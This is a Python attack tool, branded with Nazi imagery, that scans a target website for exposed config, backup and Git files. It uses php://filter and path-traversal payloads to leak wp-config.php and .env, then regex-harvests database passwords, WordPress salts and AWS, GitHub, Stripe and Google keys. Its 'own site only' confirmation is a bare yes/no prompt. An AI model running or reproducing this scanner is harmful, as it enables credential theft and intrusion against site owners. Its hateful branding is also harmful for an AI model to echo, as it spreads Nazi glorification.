#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EYE OF NAZI v53.0 - SOURCE HUNTER
# Made by Cyber Kurd Team

import sys, os, re, ssl, time, json, base64
import urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

LOGO = r"""
\033[91m\033[1m
   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
\033[0m\033[93m\033[1m                    EYE OF NAZI
\033[96m=============================================================\033[0m
\033[97m\033[1m              SOURCE HUNTER v53.0\033[0m
\033[2m              Made by Cyber Kurd Team\033[0m
\033[96m=============================================================\033[0m
"""

# PHP source files to try to leak
PHP_SOURCE_FILES = [
    'wp-config.php',
    'config.php',
    'configuration.php',
    'config.inc.php',
    'settings.php',
    'database.php',
    'db.php',
    'connect.php',
    'connection.php',
    'functions.php',
    'includes/config.php',
    'includes/db.php',
    'admin/config.php',
    'admin/config.inc.php',
    'application/config.php',
    'application/config/database.php',
    'app/config.php',
    'app/config/database.php',
    'core/config.php',
    'system/config.php',
    'library/config.php',
    'src/config.php',
    'index.php',
    'wp-load.php',
    'wp-settings.php',
    'wp-includes/functions.php',
    'wp-includes/version.php',
    'wp-content/themes/index.php',
    'wp-admin/admin.php',
    'wp-admin/setup-config.php',
]

# Backup files to try
BACKUP_FILES = [
    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
    'wp-config.php.save', 'wp-config.php.orig', 'wp-config.php.txt',
    'wp-config.php.swp', 'wp-config.php.swo', 'wp-config.txt',
    'wp-config.php.copy', 'wp-config.php.backup',
    '.wp-config.php.swp', '.#wp-config.php',
    'config.php.bak', 'config.php~', 'config.php.old',
    'config.php.save', 'config.php.orig', 'config.php.txt',
    'config.php.swp', 'config.php.swo',
    'configuration.php.bak', 'configuration.php~', 'configuration.php.old',
    'config.inc.php.bak', 'config.inc.php~',
    'settings.php.bak', 'settings.php~',
    'database.php.bak', 'database.php~',
    'db.php.bak', 'db.php~',
    'index.php.bak', 'index.php~', 'index.php.old',
    'index.php.save', 'index.php.orig', 'index.php.txt',
    '.index.php.swp', '.index.php.swo',
    'functions.php.bak', 'functions.php~',
    '.env.bak', '.env.old', '.env.save', '.env.orig', '.env.copy',
    '.env.backup', '.env.txt', '.env.example',
    'config.json.bak', 'config.json~', 'config.json.old',
    'config.yml.bak', 'config.yml~',
    'config.yaml.bak', 'config.yaml~',
    'settings.py.bak', 'settings.py~',
    'database.yml.bak', 'database.yml~',
    'phpinfo.php.bak', 'phpinfo.php~',
    'info.php.bak', 'info.php~',
    'test.php.bak', 'test.php~',
    'debug.php.bak', 'debug.php~',
    'readme.html.bak', 'readme.html~',
    'README.md.bak', 'README.md~',
    'license.txt.bak', 'license.txt~',
    '.htaccess.bak', '.htaccess~', '.htaccess.old',
    'web.config.bak', 'web.config~',
    'nginx.conf.bak', 'nginx.conf~',
    '.DS_Store', 'Thumbs.db', 'desktop.ini',
]

# Git exposure files
GIT_FILES = [
    '.git/config',
    '.git/HEAD',
    '.git/index',
    '.git/logs/HEAD',
    '.git/refs/heads/master',
    '.git/refs/heads/main',
    '.git/COMMIT_EDITMSG',
    '.git/description',
    '.git/info/exclude',
    '.gitignore',
    '.gitmodules',
    '.gitattributes',
    '.svn/entries',
    '.svn/wc.db',
    '.hg/hgrc',
    '.hgignore',
    '.bzr/branch/branch.conf',
    '.git-credentials',
    '.gitconfig',
]

# PHP filter paths
PHP_FILTER_PATHS = [
    'php://filter/convert.base64-encode/resource=wp-config.php',
    'php://filter/convert.base64-encode/resource=config.php',
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/read=convert.base64-encode/resource=wp-config.php',
    'php://filter/read=convert.base64-encode/resource=config.php',
    'php://filter/convert.base64-encode/resource=../wp-config.php',
    'php://filter/convert.base64-encode/resource=../../wp-config.php',
    'php://filter/convert.base64-encode/resource=../../../wp-config.php',
    'php://filter/convert.base64-encode/resource=settings.php',
    'php://filter/convert.base64-encode/resource=database.php',
    'php://filter/convert.base64-encode/resource=.env',
    'php://filter/convert.base64-encode/resource=config.json',
    'php://filter/convert.base64-encode/resource=config.yml',
    'php://filter/read=string.rot13/resource=wp-config.php',
    'php://filter/read=string.toupper/resource=wp-config.php',
    'php://filter/read=string.tolower/resource=wp-config.php',
    'php://input',
    'php://stdin',
    'php://fd/1',
    'php://memory',
    'php://temp',
]

# Password patterns
PASS_PATTERNS = [
    r'define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_PASSWORD[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]DB_CHARSET[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]AUTH_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]SECURE_AUTH_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]LOGGED_IN_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]NONCE_KEY[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]AUTH_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]SECURE_AUTH_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]LOGGED_IN_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]NONCE_SALT[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]WP_HOME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]WP_SITEURL[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'define\s*\(\s*[\'"]WP_DEBUG[\'"]\s*,\s*([a-z]+)',
    r'define\s*\(\s*[\'"]TABLE_PREFIX[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
    r'DB_NAME\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'DB_USER\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'DB_PASSWORD\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'DB_HOST\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'database\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'username\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'password\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'host\s*=\s*[\'"]([^\'"]+)[\'"]',
    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'token["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'access[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_PASS\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_USER\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_NAME\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DB_HOST\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'MYSQL_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'MYSQL_ROOT_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'DATABASE_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'SMTP_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'MAIL_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'ADMIN_PASSWORD\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'JWT_SECRET\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'APP_KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'APP_SECRET\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'SECRET_KEY\s*[:=]\s*["\']([^"\'\s]{4,80})["\']',
    r'AKIA[0-9A-Z]{16}',
    r'ghp_[0-9a-zA-Z]{36}',
    r'sk_live_[0-9a-zA-Z]{24,}',
    r'AIza[0-9A-Za-z\-_]{35}',
]


class Client:
    def __init__(self, timeout=10, cookie=None, proxy=None):
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"

    def req(self, url):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if self.proxy:
            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
        else:
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
        if self.cookie:
            hdrs['Cookie'] = self.cookie
        r = urllib.request.Request(url, headers=hdrs)
        t0 = time.time()
        try:
            rp = op.open(r, timeout=self.timeout)
            body = rp.read()
            return {'s': rp.getcode(), 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except urllib.error.HTTPError as e:
            try:
                body = e.read()
            except Exception:
                body = b''
            return {'s': e.code, 't': body.decode('utf-8', 'ignore'),
                    'n': len(body), 'dt': time.time() - t0, 'err': None}
        except Exception as e:
            return {'s': 0, 't': '', 'n': 0, 'dt': time.time() - t0, 'err': str(e)}


class Hunter:
    def __init__(self, url, cl, threads=20):
        self.url = url.rstrip('/')
        self.cl = cl
        self.threads = threads
        self.findings = []
        self.passwords = []
        self.source = []

    def add(self, url, kind, evidence, severity="CRITICAL"):
        self.findings.append({'url': url, 'type': kind,
                              'evidence': evidence[:300], 'severity': severity})
        icons = {
            'SOURCE': '\033[95m[SOURCE]\033[0m',
            'BACKUP': '\033[92m[BACKUP]\033[0m',
            'GIT': '\033[41m\033[97m[GIT]\033[0m',
            'PASSWORD': '\033[41m\033[97m[PASSWORD]\033[0m',
            'FILTER': '\033[93m[FILTER]\033[0m',
        }
        icon = icons.get(kind, '[' + kind + ']')
        print("\n  " + icon + " \033[1m" + severity + "\033[0m")
        print("    URL     : " + url[:120])
        print("    Evidence: " + evidence[:250])

    def test_php_source(self):
        print("\n\033[96m[1/5]\033[0m PHP Source Leak...")
        found = 0
        for path in PHP_SOURCE_FILES:
            full = self.url + '/' + path
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            if r['n'] > 0 and ('<?php' in r['t'] or 'define(' in r['t']
                               or 'DB_' in r['t'] or '$' in r['t'][:200]):
                self.add(full, 'SOURCE',
                         "PHP source leaked (" + str(r['n']) + "B)",
                         "CRITICAL")
                self.source.append({'url': full, 'content': r['t'][:500]})
                found += 1
        print("  \033[92m[+]\033[0m Found " + str(found) + " PHP source file(s)")

    def test_backup(self):
        print("\n\033[96m[2/5]\033[0m Backup Files...")
        found = 0
        for path in BACKUP_FILES:
            full = self.url + '/' + path
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            if r['n'] > 0:
                self.add(full, 'BACKUP',
                         "Backup exposed (" + str(r['n']) + "B)",
                         "CRITICAL")
                found += 1
        print("  \033[92m[+]\033[0m Found " + str(found) + " backup file(s)")

    def test_git(self):
        print("\n\033[96m[3/5]\033[0m Git Exposure...")
        found = 0
        for path in GIT_FILES:
            full = self.url + '/' + path
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            if r['n'] > 0:
                self.add(full, 'GIT',
                         "Git exposed (" + str(r['n']) + "B)",
                         "CRITICAL")
                found += 1
        print("  \033[92m[+]\033[0m Found " + str(found) + " git file(s)")

    def test_php_filter(self):
        print("\n\033[96m[4/5]\033[0m PHP Filter...")
        found = 0
        for path in PHP_FILTER_PATHS:
            full = self.url + '/' + path
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            if r['n'] > 0:
                self.add(full, 'FILTER',
                         "PHP filter worked (" + str(r['n']) + "B)",
                         "CRITICAL")
                found += 1
        print("  \033[92m[+]\033[0m Found " + str(found) + " filter")

    def extract_passwords(self):
        print("\n\033[96m[5/5]\033[0m Password Extraction...")
        found = 0
        # From PHP source
        for item in self.source:
            text = item['content']
            for pat in PASS_PATTERNS:
                try:
                    for m in re.findall(pat, text, re.IGNORECASE):
                        if isinstance(m, tuple):
                            for x in m:
                                if x and 2 <= len(x) <= 200:
                                    self.passwords.append({'url': item['url'],
                                                           'value': x})
                                    self.add(item['url'], 'PASSWORD',
                                             x, "CRITICAL")
                                    found += 1
                        elif m and 2 <= len(m) <= 200:
                            self.passwords.append({'url': item['url'],
                                                   'value': m})
                            self.add(item['url'], 'PASSWORD',
                                     m, "CRITICAL")
                            found += 1
                except Exception:
                    pass
        # From backup files
        for path in BACKUP_FILES[:50]:
            full = self.url + '/' + path
            r = self.cl.req(full)
            if r['err'] or r['s'] != 200:
                continue
            text = r['t']
            for pat in PASS_PATTERNS:
                try:
                    for m in re.findall(pat, text, re.IGNORECASE):
                        if isinstance(m, tuple):
                            for x in m:
                                if x and 2 <= len(x) <= 200:
                                    self.passwords.append({'url': full,
                                                           'value': x})
                                    self.add(full, 'PASSWORD',
                                             x, "CRITICAL")
                                    found += 1
                        elif m and 2 <= len(m) <= 200:
                            self.passwords.append({'url': full,
                                                   'value': m})
                            self.add(full, 'PASSWORD',
                                     m, "CRITICAL")
                            found += 1
                except Exception:
                    pass
        print("  \033[92m[+]\033[0m Found " + str(found) + " password(s)")

    def run(self):
        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("\033[1m  [*] TARGET: " + self.url + "\033[0m")
        print("\033[96m" + "=" * 60 + "\033[0m")

        try:
            self.test_php_source()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_backup()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_git()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.test_php_filter()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        try:
            self.extract_passwords()
        except Exception as e:
            print("  \033[91m[!]\033[0m " + str(e))

        print("\n\033[96m" + "=" * 60 + "\033[0m")
        print("  Total Findings: \033[1m\033[91m" + str(len(self.findings)) + "\033[0m")
        print("  Source Files: " + str(len(self.source)))
        print("  Passwords: " + str(len(self.passwords)))
        print("\033[96m" + "=" * 60 + "\033[0m\n")

        if not self.findings:
            print("  \033[92mNo findings.\033[0m\n")

    def save_json(self, filename):
        with open(filename, 'w', encoding='utf-8') as fp:
            json.dump({
                'target': self.url,
                'findings': self.findings,
                'passwords': self.passwords,
                'source_count': len(self.source),
            }, fp, indent=2, ensure_ascii=False)
        print("\033[92m[+]\033[0m Saved: " + filename)


def is_url(text):
    if text.startswith(('http://', 'https://')):
        return True
    if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
        return True
    return False


def main():
    print(LOGO)
    print("\n\033[96m" + "=" * 60 + "\033[0m")
    print("\033[92m  Source Hunter - Type your own site domain.\033[0m")
    print("\033[93m  Warning: Use only on YOUR OWN site!\033[0m")
    print("\033[96m" + "=" * 60 + "\033[0m\n")

    st = {'cookie': None, 'proxy': None, 'threads': 20, 'last': None}

    while True:
        try:
            line = input("\033[1m\033[92mnazi\033[0m\033[93m@\033[0m"
                         "\033[96mforge\033[0m \033[94m>>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n\033[93m[!] Bye\033[0m")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ""

        if cmd in ('exit', 'quit', 'q'):
            print("\033[93mBye.\033[0m")
            break
        elif cmd == 'cookie':
            if arg:
                st['cookie'] = arg
                print("\033[92m[+] Cookie set\033[0m")
        elif cmd == 'proxy':
            if arg:
                st['proxy'] = arg
                print("\033[92m[+] Proxy set\033[0m")
        elif cmd == 'threads':
            if arg:
                try:
                    st['threads'] = int(arg)
                    print("\033[92m[+] Threads: " + arg + "\033[0m")
                except Exception:
                    pass
        elif cmd == 'status':
            print("\n  Cookie: " + str(st['cookie']))
            print("  Proxy: " + str(st['proxy']))
            print("  Threads: " + str(st['threads']) + "\n")
        elif cmd == 'clear':
            os.system('clear')
            print(LOGO)
        elif cmd == 'save':
            if st['last'] and arg:
                st['last'].save_json(arg)
        elif is_url(cmd):
            url = cmd if cmd.startswith(('http://', 'https://')) else 'http://' + cmd
            print("\n\033[93m[!]\033[0m Only use on YOUR OWN site!")
            print("\033[93m[?]\033[0m Scanning: \033[1m" + url + "\033[0m")
            conf = input("\033[93m    Confirm you own this site? (yes/no): \033[0m").strip().lower()
            if conf not in ('yes', 'y', 'بەڵێ', 'b'):
                print("\033[93m[!] Aborted.\033[0m")
                continue
            cl = Client(timeout=10, cookie=st['cookie'], proxy=st['proxy'])
            sc = Hunter(url, cl, threads=st['threads'])
            try:
                sc.run()
                st['last'] = sc
            except KeyboardInterrupt:
                print("\n\033[93m[!] Stopped\033[0m")
                st['last'] = sc
            except Exception as e:
                print("\n\033[91m[!] Error: " + str(e) + "\033[0m")
        else:
            print("\033[91m[!] Unknown: " + cmd + "\033[0m")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\033[93m[!] Bye\033[0m")
